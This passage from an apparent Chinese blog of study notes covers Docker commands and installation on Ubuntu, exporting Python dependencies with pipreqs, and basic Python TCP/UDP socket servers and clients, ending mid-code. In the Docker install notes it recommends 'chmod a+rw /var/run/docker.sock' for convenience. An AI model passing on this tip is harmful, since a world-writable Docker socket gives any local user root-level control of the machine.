<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载镜像 docker pull 镜像名[:tag]</span></span><br><span class="line">root@ubuntu:/home/guoxb/Desktop# docker pull mysql</span><br><span class="line">Using default tag: latest				#如果不写tag，默认就是latest</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete 			#分层下载，docker image的核心 联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709	#签名信息</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest	#仓库的真实地址</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">等价命令</span></span><br><span class="line">docker pull mysql == docker pull docker.io/library/mysql:latest </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">制定版本下载（只能使dock hub中已有的版本）</span></span><br><span class="line">root@ubuntu:/home/guoxb/Desktop# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists </span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>

<p>root@ubuntu:&#x2F;home&#x2F;guoxb&#x2F;Desktop# docker images<br>REPOSITORY   TAG       IMAGE ID       CREATED        SIZE<br>mysql        5.7       c20987f18b13   2 months ago   448MB<br>mysql        latest    3218b38490ce   2 months ago   516MB</p>
<p><strong>docker rmi</strong> 删除镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/guoxb/Desktop# docker rmi -f 镜像id		#删除指定的镜像</span><br><span class="line">root@ubuntu:/home/guoxb/Desktop# docker rmi -f 镜像id 镜像id 镜像id #删除多个镜像</span><br><span class="line">root@ubuntu:/home/guoxb/Desktop# docker rmi -f $(docker images -aq) #删除全部镜像</span><br></pre></td></tr></table></figure>

<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明:我们有了镜像才可以常见容器，linux，下载一个centos学习</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数说明</span></span><br><span class="line">--name=&quot;NAME&quot; 	容器名字</span><br><span class="line">-d				后台运行方式，</span><br><span class="line">-it				使用交互方式运行，进入容器查看内容</span><br><span class="line">-p				指定容器的端口 -p 8080:8080</span><br><span class="line">	-p ip:主机端口:容器端口</span><br><span class="line">	-p 主机端口:容器端口（常用）</span><br><span class="line">	-p 容器端口</span><br><span class="line">	容器端口</span><br><span class="line">-P				随机指定端口</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动并进入容器</span></span><br><span class="line">root@ubuntu:/home/guoxb/Desktop# docker run -it centos</span><br><span class="line">[root@d1f26cb642ba /]# </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root后的主机名就是容器<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从容器中退回主机 <span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出正在运行的主机 docker ps</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>docker命令</strong></p>
<p><img src="https://gitee.com/GXB0_0/picture/raw/master/img/20220317175000.png"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装</title>
    <url>/2023/09/11/docker/docker%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>参考自：<a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p>
<p>项目地址：<a href="https://github.com/yeasy/docker_practice">https://github.com/yeasy/docker_practice</a></p>
<span id="more"></span>

<h2 id="0x01-安装-Docker"><a href="#0x01-安装-Docker" class="headerlink" title="0x01 安装 Docker"></a>0x01 安装 Docker</h2><h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>按照 gitbook 中的教程，首先卸载旧版本的 Docker（也称为 docker&#x2F;docker-engine） ，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get remove docker \</span></span><br><span class="line"><span class="language-bash">               docker-engine \</span></span><br><span class="line"><span class="language-bash">               docker.io</span></span><br></pre></td></tr></table></figure>

<p>由于 <code>apt</code> 源使用 HTTPS 以确保软件下载过程中不被篡改。接下来，需要添加使用 HTTPS 传输的软件包以及 CA 证书。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install \</span></span><br><span class="line"><span class="language-bash">    apt-transport-https \</span></span><br><span class="line"><span class="language-bash">    ca-certificates \</span></span><br><span class="line"><span class="language-bash">    curl \</span></span><br><span class="line"><span class="language-bash">    gnupg \</span></span><br><span class="line"><span class="language-bash">    lsb-release</span></span><br></pre></td></tr></table></figure>

<p>这里在执行 <code>apt-get update</code> 命令时，出现了如下报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E: Problem executing scripts APT::Update::Post-Invoke-Success &#x27;if /usr/bin/test -w /var/cache/app-info -a -e /usr/bin/appstreamcli; then appstreamcli refresh &gt; /dev/null; fi&#x27;</span><br><span class="line">E: Sub-process returned an error code</span><br></pre></td></tr></table></figure>

<p>参考<a href="https://blog.csdn.net/weixin_44330367/article/details/130336258">该博客</a>进行修复问题。</p>
<p>为了确认所下载软件包的合法性，需要添加软件源的 <code>GPG</code> 密钥，使用国内源。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span></span><br></pre></td></tr></table></figure>

<p>然后，我们需要向 <code>sources.list</code> 中添加 Docker 软件源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> \</span></span><br><span class="line"><span class="language-bash">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span></span><br></pre></td></tr></table></figure>

<p>更新 apt 软件包缓存，并安装 docker-ce（社区版）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install docker-ce docker-ce-cli containerd.io</span></span><br></pre></td></tr></table></figure>

<h3 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>

<p>执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker 的稳定(stable)版本安装在系统中。</p>
<h3 id="启动-docker-服务"><a href="#启动-docker-服务" class="headerlink" title="启动 docker 服务"></a>启动 docker 服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="built_in">enable</span> docker</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl start docker</span></span><br></pre></td></tr></table></figure>

<h3 id="建立-Docker-用户组，避免每次都输入-sudo"><a href="#建立-Docker-用户组，避免每次都输入-sudo" class="headerlink" title="建立 Docker 用户组，避免每次都输入 sudo"></a>建立 Docker 用户组，避免每次都输入 sudo</h3><p>参考自博客：<a href="https://murphypei.github.io/blog/2018/12/docker-add-group">https://murphypei.github.io/blog/2018/12/docker-add-group</a></p>
<p><strong>为什么 docker 命令需要 sudo ?</strong></p>
<p>默认情况下，<code>docker</code> 命令会使用 <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix socket</a> 与 Docker 引擎通讯。而只有 <code>root</code> 用户和 <code>docker</code> 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 <code>root</code> 用户。因此，更好地做法是将需要使用 <code>docker</code> 的用户加入 <code>docker</code> 用户组。目前最新的 Docker 会自动创建一个 docker 用户组。</p>
<p>建立 docker 组：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span></span><br></pre></td></tr></table></figure>

<p>将当前用户加入到 docker 组：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="variable">$USER</span></span></span><br></pre></td></tr></table></figure>

<p>查看 docker 用户组：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/group | grep docker</span></span><br></pre></td></tr></table></figure>

<p>退出当前终端并重新登录，进行测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su <span class="variable">$USER</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --<span class="built_in">rm</span> hello-world</span></span><br></pre></td></tr></table></figure>

<p>出现下面的结果即表示安装成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unable to find image &#x27;hello-world:latest&#x27; locally</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">b8dfde127a29: Pull complete</span><br><span class="line">Digest: sha256:308866a43596e83578c7dfa15e27a73011bdd402185a84c5cd7f32a88b501a24</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure>



<p><strong>补充：</strong></p>
<p>实测发现只按照 gitbook 上的命令，每次打开终端都需要退出当前用户并重新登陆，有些不方便，按照<a href="https://murphypei.github.io/blog/2018/12/docker-add-group">博客</a>中的方法，修改守护进程绑定的套接字的权限，使其能够被 docker 分组访问：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> a+rw /var/run/docker.sock</span></span><br></pre></td></tr></table></figure>

<p>之后，打开新的终端也不需要再重新登陆了。</p>
<h2 id="0x02-docker-常用命令及其参数"><a href="#0x02-docker-常用命令及其参数" class="headerlink" title="0x02 docker 常用命令及其参数"></a>0x02 docker 常用命令及其参数</h2><p>从 <a href="https://hub.docker.com/">Docker 镜像仓库</a>获取镜像的命令：<code>docker pull</code>。其命令格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]</span><br></pre></td></tr></table></figure>

<p>······</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
  </entry>
  <entry>
    <title>python-scrapy爬虫</title>
    <url>/2023/04/04/python/python-scrapy%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<p>挖坑，待填</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python导出依赖包</title>
    <url>/2023/05/16/python/python%E5%AF%BC%E5%87%BA%E4%BE%9D%E8%B5%96%E5%8C%85/</url>
    <content><![CDATA[<h1 id="Python导出项目依赖包"><a href="#Python导出项目依赖包" class="headerlink" title="Python导出项目依赖包"></a>Python导出项目依赖包</h1><p>python项目开发完后，需要部署到生产或其他环境下，为了快速安装当前项目所需要的依赖包，常规的做法：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure>

<p>此方法是导出pip安装的所有依赖包，而不仅仅是当前项目，这么做显然没有必要。</p>
<p>python 提供了<strong>pipreqs</strong>包解决这个问题。</p>
<h2 id="1-安装pipreqs"><a href="#1-安装pipreqs" class="headerlink" title="1.安装pipreqs"></a>1.安装pipreqs</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pipreqs</span><br></pre></td></tr></table></figure>

<h2 id="2-进入当前项目根目录下执行"><a href="#2-进入当前项目根目录下执行" class="headerlink" title="2.进入当前项目根目录下执行"></a>2.进入当前项目根目录下执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pipreqs . --encoding=utf8 --force</span><br></pre></td></tr></table></figure>

<p>“.” 指的是将导出依赖包的文件放在当前目录下</p>
<p>“–encoding&#x3D;utf8” 指的是存放文件的编码为utf-8,否则会报错</p>
<p>“–force” –force 强制执行，当生成目录下的requirements.txt存在时强子覆盖</p>
<h2 id="3-在新的环境下，进入项目根目录执行以下脚本完成所有依赖包的安装"><a href="#3-在新的环境下，进入项目根目录执行以下脚本完成所有依赖包的安装" class="headerlink" title="3.在新的环境下，进入项目根目录执行以下脚本完成所有依赖包的安装"></a>3.在新的环境下，进入项目根目录执行以下脚本完成所有依赖包的安装</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install <span class="literal">-r</span> requirements.txt</span><br></pre></td></tr></table></figure>

<p>这样做的好处可以保证依赖包的版本跟开发环境一样，避免了很多坑。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-socket网络编程</title>
    <url>/2023/04/04/python/python-socket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Python-Socket"><a href="#Python-Socket" class="headerlink" title="Python Socket"></a>Python Socket</h1><p>python 中 socket 的通信逻辑如下图所示： </p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/python_socket.png" alt="python_socket"></p>
<span id="more"></span>

<p>在python中使用 socket 首先需要导入 socket 库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br></pre></td></tr></table></figure>

<p>然后使用 socket 库中的 <code>socker.socket()</code>方法来创建一个新的 socket 对象（套接字），用于与另一个设备建立网络连接，语法格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket = socket.socket([family, [<span class="built_in">type</span>, [proto]]])</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>family：这个参数指定 socket 的地址族，取值可选 <code>AF_INET</code>（IPv4）或 <code>AF_INET6</code>(IPv6)。如果未指定，则默认为 <code>AF_INET</code></li>
<li>type：这个参数指定 socket 的类型，取值可选 <code>SOCK_STREAM</code>（TCP）或 <code>SOCK_DGRAM</code>（UDP）。如果未指定，则默认 socket 类型为 <code>SOCK_STREAM</code></li>
<li>proto：这个参数指定socket使用的协议，取值可选 <code>IPPROTO_TCP</code> 或 <code>IPPROTO_UDP</code>。如果未指定，则根据 family 和 type 来选择默认协议，一般不填。</li>
</ul>
<p>通过<code>s = socket.socket()</code>方法，我们可以获得一个 socket 对象（套接字），该对象有如下方法：</p>
<table>
<thead>
<tr>
<th>作为服务端</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>s.bind( <strong>(IP, PORT)</strong> )</td>
<td>该方法将 socket 绑定到特定的网络地址。参数是一个元组，包含 socket 要监听的 <strong>IP</strong> 地址和 <strong>PORT</strong> 端口号。</td>
</tr>
<tr>
<td>s.listen( backlog )</td>
<td>该方法开始在 socket 上监听传入（incomeing）的连接。backlog 参数指定 socket 可以处理的最大排队连接数。该值至少为1，大部分应用程序设置为5就可以。</td>
</tr>
<tr>
<td>s.accept()</td>
<td>该方法接受 socket 上的新传入连接（客户端连接），并返回（conn，address）二元元组，其中 conn 是一个通信对象，可以用来接收和发送数据；address 是连接客户端的地址。该方法会阻塞进程，直到收到新的连接。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>作为客户端</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>s.connect( <strong>(IP, PROT)</strong> )</td>
<td>该方法启动与远程 socket 的连接，即客户端向服务端发起连接。参数是一个元组，包含 socket 要监听的 <strong>IP</strong> 地址和 <strong>PORT</strong> 端口号。如果连接出错，返回 socket.error 错误。</td>
</tr>
<tr>
<td>s.connect_ex()</td>
<td>connect() 函数的拓展版本，出错时返回出错码，而不是抛出异常</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>公共方法</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>s.recv( <strong>bufsize</strong> )</td>
<td>接收数据，数据以bytes类型返回，bufsize 指定要接收的最大数据量。</td>
</tr>
<tr>
<td>s.recvform()</td>
<td>接收UDP数据，与 recv() 类似，但返回值是（data，address）。其中 data 是包含接收的数据，address 是发送数据的 socket（套接字）地址。</td>
</tr>
<tr>
<td>s.send()</td>
<td>发送数据，返回值是要发送的字节数量。</td>
</tr>
<tr>
<td>s.sendall()</td>
<td>完整发送数据。将数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。</td>
</tr>
<tr>
<td>s.sendto( <strong>data, address</strong> )</td>
<td>发送UDP数据，将数据 data 发送给套接字，address是形式为（ IP，PORT ）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td>s.close()</td>
<td>关闭套接字，必须执行。</td>
</tr>
<tr>
<td>······</td>
<td></td>
</tr>
</tbody></table>
<p><strong>注意：</strong></p>
<ol>
<li>使用SOCK_STREAM&#x2F;TCP 套接字才有”连接”的概念，其他一些 Socket 如：UDP、ICMP、ARP 没有连接的概念，它们是无连接通信，意味着你可以从任何人或者给任何人接收和发送数据包。</li>
<li>Python3以后，socket传递的都是 bytes 类型的数据，字符串需要先转化一下，<code>string.encode()</code>即可；另一端接收到的 bytes 数据想转换成字符串，只要 <code>bytes.decode()</code>一下就可以。</li>
<li>在正常通信时，<code>accept()</code>和<code>recv()</code>方法都是阻塞的。阻塞是指程序会暂停，直到等到有数据传入。</li>
</ol>
<h2 id="Socket-编程思路"><a href="#Socket-编程思路" class="headerlink" title="Socket 编程思路"></a>Socket 编程思路</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>常规思路即上图中 server 部分的流程：</p>
<ol>
<li>创建套接字</li>
<li>绑定套接字到本地IP与端口</li>
<li>监听连接</li>
<li>进入循环，不断接受客户端的连接请求</li>
<li>接受传来的数据，或者发送数据给对方</li>
<li>传输完毕，关闭套接字</li>
</ol>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>常规思路即上图中 client 部分的流程：</p>
<ol>
<li>创建套接字，连接服务器地址</li>
<li>发送数据，或者接收数据</li>
<li>传输完毕，关闭套接字</li>
</ol>
<p>Python的 Socket 编程通常分为 TCP 和 UDP 两种，前者是带连接的可靠传输服务，每次通信都要握手，结束传输也要挥手，数据会被检验，是使用最广的通用模式；后者是不带连接的传输服务，简单粗暴，不加控制和检查的一股脑将数据发送出去的方式，但是传输速度快，通常用于安全和可靠等级不高的业务场景，比如文件下载。</p>
<h2 id="Socket-编程实例"><a href="#Socket-编程实例" class="headerlink" title="Socket 编程实例"></a>Socket 编程实例</h2><h3 id="TCP-编程"><a href="#TCP-编程" class="headerlink" title="TCP 编程"></a>TCP 编程</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  === TCP 服务端程序 server.py ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入socket 库</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主机地址为空字符串，表示绑定本机所有网络接口ip地址</span></span><br><span class="line"><span class="comment"># 等待客户端来连接</span></span><br><span class="line">IP = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 端口号</span></span><br><span class="line">PORT = <span class="number">50000</span></span><br><span class="line"><span class="comment"># 定义一次从socket缓冲区最多读入512个字节数据</span></span><br><span class="line">BUFLEN = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个socket对象</span></span><br><span class="line"><span class="comment"># 参数 AF_INET 表示该socket网络层使用IP协议</span></span><br><span class="line"><span class="comment"># 参数 SOCK_STREAM 表示该socket传输层使用TCP协议</span></span><br><span class="line">listenSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># socket绑定地址和端口</span></span><br><span class="line">listenSocket.bind((IP, PORT))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使socket处于监听状态，等待客户端的连接请求</span></span><br><span class="line"><span class="comment"># 参数 8 表示 最多接受多少个等待连接的客户端</span></span><br><span class="line">listenSocket.listen(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;服务端启动成功，在<span class="subst">&#123;PORT&#125;</span>端口等待客户端连接...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dataSocket, addr = listenSocket.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;接受一个客户端连接:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 尝试读取对方发送的消息</span></span><br><span class="line">    <span class="comment"># BUFLEN 指定从接收缓冲里最多读取多少字节</span></span><br><span class="line">    recved = dataSocket.recv(BUFLEN)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果返回空bytes，表示对方关闭了连接</span></span><br><span class="line">    <span class="comment"># 退出循环，结束消息收发</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> recved:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取的字节数据是bytes类型，需要解码为字符串</span></span><br><span class="line">    info = recved.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;收到对方信息： <span class="subst">&#123;info&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送的数据类型必须是bytes，所以要编码</span></span><br><span class="line">    dataSocket.send(<span class="string">f&#x27;服务端接收到了信息 <span class="subst">&#123;info&#125;</span>&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端也调用close()关闭socket</span></span><br><span class="line">dataSocket.close()</span><br><span class="line">listenSocket.close()</span><br></pre></td></tr></table></figure>



<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  === TCP 客户端程序 client.py ===</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IP = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">SERVER_PORT = <span class="number">50000</span></span><br><span class="line">BUFLEN = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个socket对象，指明协议</span></span><br><span class="line">dataSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务端socket</span></span><br><span class="line">dataSocket.connect((IP, SERVER_PORT))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 从终端读入用户输入的字符串</span></span><br><span class="line">    toSend = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>  toSend ==<span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 发送消息，也要编码为 bytes</span></span><br><span class="line">    dataSocket.send(toSend.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待接收服务端的消息</span></span><br><span class="line">    recved = dataSocket.recv(BUFLEN)</span><br><span class="line">    <span class="comment"># 如果返回空bytes，表示对方关闭了连接</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> recved:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 打印读取的信息</span></span><br><span class="line">    <span class="built_in">print</span>(recved.decode())</span><br><span class="line"></span><br><span class="line">dataSocket.close()</span><br></pre></td></tr></table></figure>



<h3 id="UDP-编程"><a href="#UDP-编程" class="headerlink" title="UDP 编程"></a>UDP 编程</h3><h4 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,json</span><br><span class="line"></span><br><span class="line">BUFF_LEN = <span class="number">400</span>    <span class="comment"># 最大报文长度</span></span><br><span class="line">ADDR     = (<span class="string">&quot;&quot;</span>, <span class="number">18000</span>)  <span class="comment"># 指明服务端地址，IP地址为空表示本机所有IP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 UDP Socket</span></span><br><span class="line">server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># 绑定地址</span></span><br><span class="line">server_socket.bind(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recvbytes, client_addr = server_socket.recvfrom(BUFF_LEN)</span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;来自 <span class="subst">&#123;client_addr&#125;</span> 的请求&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收到的信息是字节，所以要解码，再反序列化</span></span><br><span class="line">    message = json.loads(recvbytes.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;获取信息&#x27;</span>:</span><br><span class="line">        <span class="comment"># 可以从数据库的数据源查询 此用户的信息</span></span><br><span class="line">        username = message[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 要发送的信息 对象</span></span><br><span class="line">        message = &#123;</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;返回信息&#x27;</span>,</span><br><span class="line">            <span 